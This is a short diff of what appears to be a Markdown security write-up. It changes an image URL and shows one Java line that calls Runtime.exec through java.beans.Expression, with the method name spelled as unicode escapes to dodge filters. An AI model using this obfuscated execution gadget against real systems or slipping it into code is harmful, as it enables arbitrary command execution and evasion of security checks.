@@ -1,4 +1,4 @@
-![image-20220111094914373](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220111094914373.png)
+![image-20220111094914373](https://img.dem0dem0.top/images/image-20220111094914373.png)
 
 ```java
 Expression expression = new Expression(Runtime.getRuntime(), "\u0065" + "\u0078" + "\u0065" + "\u0063", new Object[]{payload});
